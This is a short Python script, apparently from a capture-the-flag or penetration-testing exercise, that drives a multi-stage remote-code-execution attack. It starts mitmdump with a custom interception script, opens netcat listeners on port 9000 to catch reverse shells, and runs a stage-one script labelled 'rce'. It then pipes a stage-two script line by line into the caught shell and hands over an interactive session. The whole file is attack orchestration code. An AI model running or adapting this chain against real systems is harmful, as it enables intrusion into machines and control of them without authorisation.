#!/usr/bin/env python3

import os
from pwn import *
import time
PORT = "9000"

with os.popen('mitmdump --listen-port 8800 -k -s mitm_p_script.py &') as p:
    with process(["/usr/bin/nc", "-lvnp", str(PORT)]) as listener:
        time.sleep(2)
        with os.popen(r"./stage1.sh") as rce:
            with process(["/usr/bin/nc", "-lvnp", str(PORT)]) as listener2:
                with open("stage2.sh", 'rb') as f:
                    for i in f.readlines():
                        print(i)
                        listener.sendline(i)
                listener2.interactive()
